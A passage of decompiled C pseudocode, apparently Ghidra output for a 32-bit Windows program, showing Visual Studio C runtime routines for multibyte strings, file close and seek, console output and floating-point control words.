    *pbVar3 = *pbVar3 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar3 = (byte *)_Str;
    pcVar2 = (char *)(uint)*pbVar3;
    if (*pbVar3 == 0) {
      return pcVar2;
    }
    _Str = (char *)(pbVar3 + 1);
  } while ((*(byte *)((int)&uStack40 + ((int)pcVar2 >> 3)) >> ((uint)pcVar2 & 7) & 1) == 0);
  return (char *)pbVar3;
}



// Library Function - Single Match
//  __mbsdec
// 
// Library: Visual Studio 2015 Release

uchar * __cdecl __mbsdec(uchar *_Start,uchar *_Pos)

{
  uchar *puVar1;
  
  puVar1 = __mbsdec_l(_Start,_Pos,(_locale_t)0x0);
  return puVar1;
}



// Library Function - Single Match
//  __mbsdec_l
// 
// Library: Visual Studio 2015 Release

uchar * __cdecl __mbsdec_l(uchar *_Start,uchar *_Pos,_locale_t _Locale)

{
  int *piVar1;
  byte *pbVar2;
  int local_14 [2];
  int local_c;
  char local_8;
  
  if (_Start == (uchar *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
  }
  else if (_Pos == (uchar *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
  }
  else if (_Start < _Pos) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(__crt_locale_pointers *)_Locale);
    if (*(int *)(local_c + 8) != 0) {
      pbVar2 = _Pos + -1;
      do {
        pbVar2 = pbVar2 + -1;
        if (pbVar2 < _Start) break;
      } while ((*(byte *)(*pbVar2 + 0x19 + local_c) & 4) != 0);
      _Pos = _Pos + -((int)_Pos - (int)pbVar2 & 1U);
    }
    if (local_8 != '\0') {
      *(uint *)(local_14[0] + 0x350) = *(uint *)(local_14[0] + 0x350) & 0xfffffffd;
      return _Pos + -1;
    }
    return _Pos + -1;
  }
  return (uchar *)0x0;
}



// Library Function - Multiple Matches With Different Base Names
//  __msize
//  __msize_base
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

size_t __cdecl FID_conflict___msize_base(void *_Memory)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_0041c220,0,_Memory);
  return SVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2015 Release

void ___set_fpsr_sse2(uint param_1)

{
  return;
}



// Library Function - Single Match
//  __clrfp
// 
// Library: Visual Studio 2015 Release

int __clrfp(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



// Library Function - Single Match
//  __ctrlfp
// 
// Library: Visual Studio 2015 Release

int __ctrlfp(undefined4 param_1,undefined4 param_2)

{
  short in_FPUControlWord;
  
  return (int)in_FPUControlWord;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __set_statfp
// 
// Library: Visual Studio 2015 Release

void __set_statfp(uint param_1)

{
  return;
}



// Library Function - Single Match
//  __statfp
// 
// Library: Visual Studio 2015 Release

int __statfp(void)

{
  short in_FPUStatusWord;
  
  return (int)in_FPUStatusWord;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_123407a5e2ac06da108355a851863b7a>,class <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class
// <lambda_ae55bdf541ad94d75914d381c370e64d>>(class
// <lambda_123407a5e2ac06da108355a851863b7a>&&,class
// <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class <lambda_ae55bdf541ad94d75914d381c370e64d>&&)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_seh_guarded_call<int>::
operator___class__lambda_123407a5e2ac06da108355a851863b7a__class__lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec___class__lambda_ae55bdf541ad94d75914d381c370e64d___
          (__crt_seh_guarded_call_int_ *this,_lambda_123407a5e2ac06da108355a851863b7a_ *param_1,
          _lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ *param_2,
          _lambda_ae55bdf541ad94d75914d381c370e64d_ *param_3)

{
  uint _FileHandle;
  int iVar1;
  int *piVar2;
  
  ___acrt_lowio_lock_fh(*(uint *)param_1);
  _FileHandle = **(uint **)param_2;
  if ((*(byte *)((&DAT_0041bfc8)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1)
      == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
    iVar1 = -1;
  }
  else {
    iVar1 = __close_nolock(_FileHandle);
  }
  FUN_0041043e();
  return iVar1;
}



void FUN_0041043e(void)

{
  int unaff_EBP;
  
  ___acrt_lowio_unlock_fh(**(uint **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  int __cdecl __acrt_lowio_lock_fh_and_call<class
// <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>>(int,class <lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&&)
// 
// Library: Visual Studio 2015 Release

int __cdecl
__acrt_lowio_lock_fh_and_call_class__lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec___
          (int param_1,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ *param_2)

{
  int iVar1;
  int local_10;
  int local_c;
  __crt_seh_guarded_call_int_ local_5;
  
  local_c = param_1;
  local_10 = param_1;
  iVar1 = __crt_seh_guarded_call<int>::
          operator___class__lambda_123407a5e2ac06da108355a851863b7a__class__lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec___class__lambda_ae55bdf541ad94d75914d381c370e64d___
                    (&local_5,(_lambda_123407a5e2ac06da108355a851863b7a_ *)&local_10,param_2,
                     (_lambda_ae55bdf541ad94d75914d381c370e64d_ *)&local_c);
  return iVar1;
}



// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2015 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int *local_8;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if (((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041c1c8)) &&
       ((*(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3fU) * 0x30) & 1) !=
        0)) {
      local_8 = &_FileHandle;
      iVar3 = __acrt_lowio_lock_fh_and_call_class__lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec___
                        (_FileHandle,(_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ *)&local_8);
      return iVar3;
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004091be();
  }
  return -1;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2015 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  int iVar4;
  DWORD DVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_0041bfc8 + 0x88) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_0041bfc8 + 0x58) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_00410507;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar5 = GetLastError();
      goto LAB_00410559;
    }
  }
LAB_00410507:
  DVar5 = 0;
LAB_00410559:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3fU) * 0x30) = 0;
  if (DVar5 == 0) {
    iVar4 = 0;
  }
  else {
    ___acrt_errno_map_os_error(DVar5);
    iVar4 = -1;
  }
  return iVar4;
}



// Library Function - Single Match
//  void __cdecl __acrt_stdio_free_stream(class __crt_stdio_stream)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl __acrt_stdio_free_stream(__crt_stdio_stream param_1)

{
  undefined3 in_stack_00000005;
  
  *_param_1 = 0;
  _param_1[1] = 0;
  _param_1[2] = 0;
  _param_1[4] = 0xffffffff;
  _param_1[5] = 0;
  _param_1[6] = 0;
  _param_1[7] = 0;
  _param_1[3] = 0;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __int64 __cdecl common_lseek<__int64>(int,__int64,int)
// 
// Library: Visual Studio 2015 Release

__int64 __cdecl common_lseek___int64_(int param_1,__int64 param_2,int param_3)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  __int64 _Var4;
  
  if (param_1 == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < param_1) && ((uint)param_1 < DAT_0041c1c8)) {
      iVar3 = (param_1 & 0x3fU) * 0x30;
      if ((*(byte *)((&DAT_0041bfc8)[param_1 >> 6] + 0x28 + iVar3) & 1) != 0) {
        ___acrt_lowio_lock_fh(param_1);
        _Var4 = -1;
        if ((*(byte *)((&DAT_0041bfc8)[param_1 >> 6] + 0x28 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
        }
        else {
          _Var4 = common_lseek_nolock___int64_(param_1,param_2,param_3);
        }
        FUN_004106a0();
        return _Var4;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004091be();
  }
  return -1;
}



void FUN_004106a0(void)

{
  uint unaff_EDI;
  
  ___acrt_lowio_unlock_fh(unaff_EDI);
  return;
}



// Library Function - Single Match
//  __int64 __cdecl common_lseek_nolock<__int64>(int,__int64,int)
// 
// Library: Visual Studio 2015 Release

__int64 __cdecl common_lseek_nolock___int64_(int param_1,__int64 param_2,int param_3)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  BOOL BVar3;
  DWORD DVar4;
  uint local_c;
  uint local_8;
  
  hFile = (HANDLE)__get_osfhandle(param_1);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    BVar3 = SetFilePointerEx(hFile,param_2,(PLARGE_INTEGER)&local_c,param_3);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      ___acrt_errno_map_os_error(DVar4);
    }
    else if ((local_c & local_8) != 0xffffffff) {
      pbVar1 = (byte *)((&DAT_0041bfc8)[param_1 >> 6] + 0x28 + (param_1 & 0x3fU) * 0x30);
      *pbVar1 = *pbVar1 & 0xfd;
      goto LAB_00410745;
    }
  }
  local_c = 0xffffffff;
  local_8 = 0xffffffff;
LAB_00410745:
  return CONCAT44(local_8,local_c);
}



// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2015 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  __int64 _Var1;
  
  _Var1 = common_lseek___int64_(_FileHandle,_Offset,_Origin);
  return _Var1;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2015 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  __int64 _Var1;
  
  _Var1 = common_lseek_nolock___int64_(_FileHandle,_Offset,_Origin);
  return _Var1;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2015 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_0041b790 == (HANDLE)0xfffffffe) {
    ___dcrt_lowio_initialize_console_output();
  }
  if ((DAT_0041b790 == (HANDLE)0xffffffff) ||
     (BVar1 = WriteConsoleW(DAT_0041b790,&_WCh,1,&local_8,(LPVOID)0x0), BVar1 == 0)) {
    _WCh = L'\xffff';
  }
  return _WCh;
}



// Library Function - Single Match
//  ___strncnt
// 
// Library: Visual Studio 2015 Release

void __cdecl ___strncnt(char *param_1,int param_2)

{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  cVar1 = *param_1;
  while ((cVar1 != '\0' && (iVar2 != param_2))) {
    iVar2 = iVar2 + 1;
    cVar1 = param_1[iVar2];
  }
  return;
}



// Library Function - Single Match
//  _fegetenv
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl _fegetenv(uint *param_1)

{
  uint uVar1;
  
  uVar1 = __getfpcontrolword();
  *param_1 = uVar1;
  uVar1 = __getfpstatusword();
  param_1[1] = uVar1;
  return 0;
}



// Library Function - Single Match
//  _fesetenv
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl _fesetenv(uint *param_1)

{
  undefined4 uVar1;
  uint local_c;
  uint local_8;
  
  local_c = 0;
  local_8 = 0;
  __setfpcontrolword(*param_1);
  __setfpstatusword(param_1[1]);
  _fegetenv(&local_c);
  if ((*param_1 == local_c) && (param_1[1] == local_8)) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}



// Library Function - Single Match
//  _feholdexcept
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl _feholdexcept(uint *param_1)

{
  int iVar1;
  uint local_c;
  uint local_8;
  
  local_c = 0;
  local_8 = 0;
  iVar1 = _fegetenv(&local_c);
  if (iVar1 == 0) {
    param_1[1] = local_8;
    *param_1 = local_c;
    local_c = local_c | 0x1f;
    iVar1 = _fesetenv(&local_c);
    if (iVar1 == 0) {
      __clearfp();
      return 0;
    }
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_004108e0(void)

{
  double dVar1;
  uint uVar2;
  undefined4 extraout_ECX;
  uint extraout_EDX;
  bool bVar3;
  uint in_MXCSR;
  ushort in_FPUControlWord;
  float10 in_ST0;
  undefined8 uVar4;
  int iVar5;
  undefined2 uVar6;
  undefined2 uVar7;
  
  if (_DAT_0041ceb4 != 0) {
    uVar2 = in_MXCSR & 0x7f80;
    bVar3 = uVar2 == 0x1f80;
    if (bVar3) {
      uVar2 = (uint)(in_FPUControlWord & 0x7f);
      bVar3 = (in_FPUControlWord & 0x7f) == 0x7f;
    }
    if (bVar3) {
      start((double)in_ST0);
      return uVar2;
    }
  }
  dVar1 = (double)in_ST0;
  iVar5 = SUB84(dVar1,0);
  uVar6 = (undefined2)((ulonglong)dVar1 >> 0x20);
  uVar7 = (undefined2)((ulonglong)dVar1 >> 0x30);
  FUN_00411758(iVar5,(uint)((ulonglong)dVar1 >> 0x20));
  uVar4 = FUN_00410938(extraout_ECX,extraout_EDX,iVar5,CONCAT22(uVar7,uVar6));
  return (uint)uVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __fastcall FUN_00410938(undefined4 param_1,uint param_2,int param_3,uint param_4)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  undefined4 uVar3;
  bool in_ZF;
  ushort in_FPUControlWord;
  ushort in_FPUStatusWord;
  undefined4 unaff_retaddr;
  uint uVar4;
  
  uVar4 = param_2 & 0xffff0000 | (uint)in_FPUControlWord;
  if (in_ZF) {
    if (((in_EAX & 0xfffff) == 0) && (param_3 == 0)) {
      uVar1 = in_EAX & 0x80000000;
      uVar2 = uVar1;
      goto joined_r0x00410987;
    }
    uVar2 = FUN_004116fc();
  }
  else {
    uVar2 = param_4;
    if ((param_4 & 0x7ff00000) == 0) {
      if (((param_4 & 0xfffff) == 0) && (param_3 == 0)) {
        uVar2 = 2;
        goto LAB_004109d1;
      }
      uVar1 = param_4 & 0x80000000;
    }
    else {
      uVar1 = param_4 & 0x80000000;
    }
joined_r0x00410987:
    if (uVar1 == 0) {
      if (_DAT_0041c234 == 0) {
        uVar1 = uVar2 & 0xffff0000 | (uint)in_FPUControlWord;
        if (in_FPUControlWord != 0x27f) {
          if (((in_FPUControlWord & 0x20) != 0) &&
             (uVar1 = uVar2 & 0xffff0000 | (uint)in_FPUStatusWord, (in_FPUStatusWord & 0x20) != 0))
          {
            uVar3 = 8;
            __startOneArgErrorHandling("log10",0x1b,in_FPUControlWord,unaff_retaddr,param_3,param_4)
            ;
            return CONCAT44(uVar4,uVar3);
          }
          uVar1 = uVar1 & 0xffff0020;
        }
        return CONCAT44(uVar4,uVar1);
      }
      goto LAB_0041176e;
    }
    uVar2 = 1;
  }
LAB_004109d1:
  if (_DAT_0041c234 == 0) {
    __startOneArgErrorHandling("log10",0x1b,in_FPUControlWord,unaff_retaddr,param_3,param_4);
    return CONCAT44(uVar4,uVar2);
  }
LAB_0041176e:
  return CONCAT44(uVar4,uVar2);
}



// WARNING: Removing unreachable block (ram,0x00410a89)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

float10 __cdecl FUN_004109f0(double param_1)

{
  uint uVar1;
  int iVar2;
  bool bVar3;
  uint in_MXCSR;
  ushort in_FPUControlWord;
  float10 fVar4;
  double dVar5;
  ulonglong uVar6;
  uint uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  
  uVar7 = (uint)((ulonglong)param_1 >> 0x20);
  if (_DAT_0041ceb4 != 0) {
    bVar3 = (in_MXCSR & 0x7f80) == 0x1f80;
    if (bVar3) {
      bVar3 = (in_FPUControlWord & 0x7f) == 0x7f;
    }
    if (bVar3) {
      uVar1 = uVar7 >> 0x14;
      uVar6 = (ulonglong)(0x433 - (uVar7 >> 0x14 & 0x7ff));
      if ((uVar1 & 0x800) == 0) {
        dVar5 = (double)(((ulonglong)param_1 >> uVar6) << uVar6);
        if (uVar1 < 0x3ff) {
          return (float10)(double)(-(ulonglong)(0.0 < param_1) & 0x3ff0000000000000);
        }
        if (uVar1 < 0x433) {
          return (float10)(dVar5 + (double)(-(ulonglong)(dVar5 < param_1) & 0x3ff0000000000000));
        }
      }
      else {
        if (uVar1 < 0xbff) {
          return (float10)-0.0;
        }
        if (uVar1 < 0xc33) {
          return (float10)(double)(((ulonglong)param_1 >> uVar6) << uVar6);
        }
      }
      return (float10)param_1;
    }
  }
  uVar1 = __ctrlfp(0x1b3f,0xffff);
  if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {
    iVar2 = __sptype(SUB84(param_1,0),uVar7);
    if (iVar2 - 1U < 3) {
      __ctrlfp(uVar1,0xffff);
      return (float10)param_1;
    }
    uVar8 = SUB84(param_1 + 1.0,0);
    uVar9 = (undefined4)((ulonglong)(param_1 + 1.0) >> 0x20);
    uVar7 = 8;
  }
  else {
    fVar4 = __frnd(param_1);
    if (((float10)param_1 == fVar4) || ((uVar1 & 0x20) != 0)) {
      __ctrlfp(uVar1,0xffff);
      return (float10)(double)fVar4;
    }
    uVar8 = SUB84((double)fVar4,0);
    uVar9 = (undefined4)((ulonglong)(double)fVar4 >> 0x20);
    uVar7 = 0x10;
  }
  fVar4 = (float10)__except1(uVar7,0xc,param_1,(double)CONCAT44(uVar9,uVar8),uVar1);
  return fVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___acrt_stdio_allocate_buffer_nolock
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_stdio_allocate_buffer_nolock(undefined4 *param_1)

{
  uint *puVar1;
  LPVOID pvVar2;
  
  _DAT_0041bc58 = _DAT_0041bc58 + 1;
  pvVar2 = __malloc_base(0x1000);
  param_1[1] = pvVar2;
  FID_conflict__free((void *)0x0);
  puVar1 = param_1 + 3;
  if (param_1[1] == 0) {
    LOCK();
    *puVar1 = *puVar1 | 0x400;
    param_1[6] = 2;
    param_1[1] = param_1 + 5;
  }
  else {
    LOCK();
    *puVar1 = *puVar1 | 0x40;
    param_1[6] = 0x1000;
  }
  param_1[2] = 0;
  *param_1 = param_1[1];
  return;
}



// Library Function - Single Match
//  ___dcrt_lowio_initialize_console_output
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void ___dcrt_lowio_initialize_console_output(void)

{
  DAT_0041b790 = CreateFileW(L"CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  ___get_abstract_control_sse2
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___get_abstract_control_sse2(uint param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  if ((param_1 & 0x7e80) != 0) {
    if ((char)param_1 < '\0') {
      uVar1 = 0x10;
    }
    if ((param_1 & 0x200) != 0) {
      uVar1 = uVar1 | 8;
    }
    if ((param_1 & 0x400) != 0) {
      uVar1 = uVar1 | 4;
    }
    if ((param_1 & 0x800) != 0) {
      uVar1 = uVar1 | 2;
    }
    if ((param_1 & 0x1000) != 0) {
      uVar1 = uVar1 | 1;
    }
    if ((param_1 & 0x6000) == 0x6000) {
      uVar1 = uVar1 | 0x300;
    }
    else if ((param_1 & 0x4000) == 0) {
      if ((param_1 & 0x2000) != 0) {
        uVar1 = uVar1 | 0x200;
      }
    }
    else {
      uVar1 = uVar1 | 0x100;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_abstract_control_x87
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___get_abstract_control_x87(uint param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  if ((param_1 & 0xc3d) != 0) {
    if ((param_1 & 1) != 0) {
      uVar1 = 0x10;
    }
    if ((param_1 & 4) != 0) {
      uVar1 = uVar1 | 8;
    }
    if ((param_1 & 8) != 0) {
      uVar1 = uVar1 | 4;
    }
    if ((param_1 & 0x10) != 0) {
      uVar1 = uVar1 | 2;
    }
    if ((param_1 & 0x20) != 0) {
      uVar1 = uVar1 | 1;
    }
    if ((param_1 & 0xc00) == 0xc00) {
      uVar1 = uVar1 | 0x300;
    }
    else if ((param_1 & 0x800) == 0) {
      if ((param_1 & 0x400) != 0) {
        uVar1 = uVar1 | 0x200;
      }
    }
    else {
      uVar1 = uVar1 | 0x100;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_machine_control
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___get_machine_control(uint param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  if ((param_1 & 799) != 0) {
    uVar1 = (uint)((param_1 & 0x10) != 0);
    if ((param_1 & 8) != 0) {
      uVar1 = uVar1 | 4;
    }
    if ((param_1 & 4) != 0) {
      uVar1 = uVar1 | 8;
    }
    if ((param_1 & 2) != 0) {
      uVar1 = uVar1 | 0x10;
    }
    if ((param_1 & 1) != 0) {
      uVar1 = uVar1 | 0x20;
    }
    if ((param_1 & 0x300) == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
    else if ((param_1 & 0x200) == 0) {
      if ((param_1 & 0x100) != 0) {
        uVar1 = uVar1 | 0x800;
      }
    }
    else {
      uVar1 = uVar1 | 0x400;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_machine_control_sse2
// 
// Library: Visual Studio 2015 Release

uint __cdecl ___get_machine_control_sse2(uint param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  if ((param_1 & 799) != 0) {
    if ((param_1 & 0x10) != 0) {
      uVar1 = 0x80;
    }
    if ((param_1 & 8) != 0) {
      uVar1 = uVar1 | 0x200;
    }
    if ((param_1 & 4) != 0) {
      uVar1 = uVar1 | 0x400;
    }
    if ((param_1 & 2) != 0) {
      uVar1 = uVar1 | 0x800;
    }
    if ((param_1 & 1) != 0) {
      uVar1 = uVar1 | 0x1000;
    }
    if ((param_1 & 0x300) == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
    else if ((param_1 & 0x200) == 0) {
      if ((param_1 & 0x100) != 0) {
        uVar1 = uVar1 | 0x4000;
      }
    }
    else {
      uVar1 = uVar1 | 0x2000;
    }
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_machine_status_sse2
// 
// Library: Visual Studio 2015 Release

byte __cdecl ___get_machine_status_sse2(uint param_1)

{
  byte bVar1;
  
  bVar1 = 0;
  if ((param_1 & 0x1f) != 0) {
    bVar1 = (param_1 & 0x10000010) == 0x10000010;
    if ((param_1 & 0x8000008) == 0x8000008) {
      bVar1 = bVar1 | 4;
    }
    if ((param_1 & 0x4000004) == 0x4000004) {
      bVar1 = bVar1 | 8;
    }
    if ((param_1 & 0x2000002) == 0x2000002) {
      bVar1 = bVar1 | 0x10;
    }
    if ((param_1 & 0x1000001) == 0x1000001) {
      bVar1 = bVar1 | 0x20;
    }
  }
  return bVar1;
}



// Library Function - Single Match
//  ___get_machine_status_x87
// 
// Library: Visual Studio 2015 Release

byte __cdecl ___get_machine_status_x87(uint param_1)

{
  byte bVar1;
  
  bVar1 = 0;
  if ((param_1 & 0x1f) != 0) {
    bVar1 = (param_1 & 0x100010) == 0x100010;
    if ((param_1 & 0x80008) == 0x80008) {
      bVar1 = bVar1 | 4;
    }
    if ((param_1 & 0x40004) == 0x40004) {
      bVar1 = bVar1 | 8;
    }
    if ((param_1 & 0x20002) == 0x20002) {
      bVar1 = bVar1 | 0x10;
    }
    if ((param_1 & 0x10001) == 0x10001) {
      bVar1 = bVar1 | 0x20;
    }
  }
  return bVar1;
}



// Library Function - Single Match
//  __getfpcontrolword
// 
// Library: Visual Studio 2015 Release

uint __getfpcontrolword(void)

{
  uint uVar1;
  uint uVar2;
  uint in_MXCSR;
  ushort in_FPUControlWord;
  uint local_c;
  
  local_c = 0;
  if (0 < DAT_0041bb84) {
    local_c = in_MXCSR;
  }
  uVar1 = ___get_abstract_control_x87((uint)in_FPUControlWord);
  uVar2 = ___get_abstract_control_sse2(local_c);
  return (uVar2 | uVar1) & 799;
}



// Library Function - Single Match
//  __getfpstatusword
// 
// Library: Visual Studio 2015 Release

uint __getfpstatusword(void)

{
  uint uVar1;
  uint uVar2;
  uint in_MXCSR;
  ushort in_FPUStatusWord;
  uint local_c;
  
  uVar2 = 0;
  local_c = 0;
  if (0 < DAT_0041bb84) {
    local_c = in_MXCSR;
  }
  uVar1 = 0;
  if ((in_FPUStatusWord & 0x3d) != 0) {
    if ((in_FPUStatusWord & 1) != 0) {
      uVar1 = 0x100010;
    }
    if ((in_FPUStatusWord & 4) != 0) {
      uVar1 = uVar1 | 0x80008;
    }
    if ((in_FPUStatusWord & 8) != 0) {
      uVar1 = uVar1 | 0x40004;
    }
    if ((in_FPUStatusWord & 0x10) != 0) {
      uVar1 = uVar1 | 0x20002;
    }
    if ((in_FPUStatusWord & 0x20) != 0) {
      uVar1 = uVar1 | 0x10001;
    }
  }
  if ((local_c & 0x3d) != 0) {
    if ((local_c & 1) != 0) {
      uVar2 = 0x10000010;
    }
    if ((local_c & 4) != 0) {
      uVar2 = uVar2 | 0x8000008;
    }
    if ((local_c & 8) != 0) {
      uVar2 = uVar2 | 0x4000004;
    }
    if ((local_c & 0x10) != 0) {
      uVar2 = uVar2 | 0x2000002;
    }
    if ((local_c & 0x20) != 0) {
      uVar2 = uVar2 | 0x1000001;
    }
  }
  return uVar1 | uVar2;
}



// Library Function - Single Match
//  __setfpcontrolword
// 
// Library: Visual Studio 2015 Release

void __cdecl __setfpcontrolword(uint param_1)

{
  ___get_machine_control(799);
  ___get_machine_control(param_1);
  if (0 < DAT_0041bb84) {
    ___get_machine_control_sse2(799);
    ___get_machine_control_sse2(param_1);
  }
  return;
}



// Library Function - Single Match
//  __setfpstatusword
// 
// Library: Visual Studio 2015 Release

void __cdecl __setfpstatusword(uint param_1)

{
  ___get_machine_status_x87(0x1f1f001f);
  ___get_machine_status_x87(param_1);
  if (0 < DAT_0041bb84) {
    ___get_machine_status_sse2(0x1f1f001f);
    ___get_machine_status_sse2(param_1);
  }
  return;
}



// Library Function - Single Match
//  start
// 
// Library: Visual Studio 2015 Release

float10 __cdecl start(double param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  double dVar7;
  undefined in_XMM0 [16];
  double dVar8;
  double dVar9;
  double dVar10;
  double dVar11;
  double dVar12;
  double local_c;
  
  iVar4 = 0;
  while( true ) {
    uVar6 = SUB168(in_XMM0,0);
    uVar2 = (uint)(ushort)(SUB162(in_XMM0 >> 0x30,0) >> 4);
    dVar7 = (double)(uVar6 & 0xfffffffffffff | 0x3ff0000000000000);
    uVar1 = SUB82(dVar7 + 4398046511103.008,0) & 0x7f0;
    dVar9 = (double)(uVar6 & 0xfffff80000000 | 0x3ff0000000000000);
    dVar12 = (double)(uVar6 & 0xfffff80000000 | 0x3ff0000000000000);
    dVar10 = dVar9 * *(double *)(&DAT_00419150 + uVar1) - 0.43359375;
    dVar7 = (dVar7 - dVar9) * *(double *)(&DAT_00419150 + uVar1);
    dVar8 = ((double)(uVar6 & 0xfffffffffffff | 0x3ff0000000000000) - dVar12) *
            *(double *)(&UNK_00419158 + uVar1);
    dVar9 = dVar7 + dVar10;
    dVar12 = dVar8 + (dVar12 * *(double *)(&UNK_00419158 + uVar1) - 0.43359375);
    uVar3 = uVar2 - 1;
    if (uVar3 < 0x7fe) {
      iVar4 = (uVar2 - 0x3ff) + iVar4;
      dVar11 = (double)iVar4;
      iVar5 = 0;
      if (uVar1 + iVar4 * 0x400 == 0) {
